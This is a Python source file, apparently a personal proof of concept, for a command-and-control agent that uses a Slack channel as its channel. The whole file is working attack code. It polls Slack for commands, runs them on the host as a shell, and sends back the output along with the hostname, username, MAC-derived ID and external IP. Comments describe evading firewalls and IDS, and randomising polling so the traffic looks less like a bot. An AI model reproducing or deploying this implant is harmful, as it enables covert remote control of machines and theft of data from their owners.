#!/usr/bin/env python3
# Rob 2023-09-22
# PoC Slack C2 RMM, a simple test remote machine monitor that communicates over Slack
# has no protections nor security so very insecure (so don't install outside of a sandbox) 

# Background: I was playing around with ways to send commands to remote devices that would likely slip past most firewalls/IDS/IPS   

import os
import requests
import uuid  # UUID based off MAC "uid = str(uuid.UUID(int=uuid.getnode()))" or the MAC as int "uuid.getnode()"
import time 
import random 
import subprocess

# Set your Slack API token
slack_token = ""

# Define the channel you want to monitor
channel_id = ""  

# Define the Slack API URL for conversations.history and chat.postMessage
history_url = f"https://slack.com/api/conversations.history?channel={channel_id}&limit=1"
post_message_url = "https://slack.com/api/chat.postMessage"

headers = {
    "Authorization": f"Bearer {slack_token}",
    "Content-Type": "application/json; charset=utf-8",
}

# Get the computer name (hostname)
if os.name == 'posix':  # Linux
    computer_name = os.uname().nodename
elif os.name == 'nt':  # Windows
    computer_name = os.environ['COMPUTERNAME']
else:
    computer_name = 'Unknown' # not Windows or Linux ?!

# get the username    
user_name = os.environ['USER'] if 'USER' in os.environ else os.environ['USERNAME']    
Last_event_time = time.time()   # the time that the last event happened
uid = str(uuid.UUID(int=uuid.getnode())) # generate a UID for this system based off MAC address

def IPinfo():   # get the external IP address details
    response = requests.get("https://ipinfo.io/json")
    response_data = response.json()    
    ipinfo_string = "IP:" + response_data['ip'] + ", Country:" + response_data['country'] + ", Org:" + response_data['org'] + ", TZ:" + response_data['timezone']
    print (ipinfo_string)
    return ipinfo_string


def Slack_postmessage(message,thread=0):
    try:
        if thread == 0: 
            message_data = {
                "channel": channel_id,
                "text": user_name+"@"+computer_name + ":\n" +message + "\n" + os.getcwd() +"$"
            }
        else:
            message_data = {
            "channel": channel_id,
            "thread_ts":thread,
            "text": user_name+"@"+computer_name + ":\n" +message + "\n" + os.getcwd() +"$"
        }    
        response = requests.post(post_message_url, json=message_data, headers=headers)
        response_data = response.json()
        if response_data["ok"]:
            print("Slack message sent successfully.")
        else:
            print(f"Error sending Slack message: {response_data['error']}")

    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")


def Slack_checkin():
    # Tell the Slack channel that we are online
    Slack_postmessage(IPinfo() + "\n" + uid)


def Slack_command_check():
    # Check the last message on Slack to see if is a command for us
    try:
        global Last_event_time
        response = requests.get(history_url, headers=headers)
        response_data = response.json()

        if response_data["ok"] and response_data["messages"]:
            last_message = response_data["messages"][0]
            # accept hostname or user@hostname or uid
            if last_message["text"].startswith("."+computer_name) or last_message["text"].startswith("."+user_name +"@"+ computer_name) or last_message["text"].startswith("."+uid):                
                # we got a command
                Last_event_time = time.time()
                command = last_message["text"].split()
                output = ""     # this is what we pass back to the Slack channel
                if len(command) >1: 
                    if command[1].lower() =="cd":
                        try:
                            os.chdir(' '.join(command[2:]))
                        except Exception as e:
                            output = str(e)
                    elif command[1].lower() =="?":  # request the external IP info again, 
                        output = IPinfo()   
                    else: 
                        try:
                            output = subprocess.getoutput(' '.join(command[1:]))
                        except Exception as e:
                            output = str(e)
                            print(str(e))           # debug exception
                else: 
                    output = "Pong!"   
                Slack_postmessage(output, last_message["ts"])     # we return the output to the server
            else:
                print("No messages for us")
        else:
            print("response not OK or no messages ?!")

    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
    except KeyError:
        print("No messages found in the channel.")    



print("Python C2 RMM ")
try: 
    Slack_command_check()   # we check if the last message is for us before we add a message that becomes the last message, else we have to check the last few messages and figure out what we have already actioned
    Slack_checkin()
    while True:
        Slack_command_check()
        if time.time() - Last_event_time < 60:  # we adjust how frequently we poll Slack based off activity and add jitter so our traffic looks slightly less bot/C2 like. 
            time.sleep(random.randint(5,10))    # last command/event was < 60seconds ago so poll slack every 10-25 seconds
        elif time.time() - Last_event_time > 600:
            time.sleep(random.randint(100,140)) # last command/event was over 10 mins ago so delay 100-140 seconds
        else:
            time.sleep(random.randint(20,40)) # last command was over 1min but under 10mins so delay 20-40 seconds
        
except Exception as e:
    print(str(e)) 
    print("End");  
      
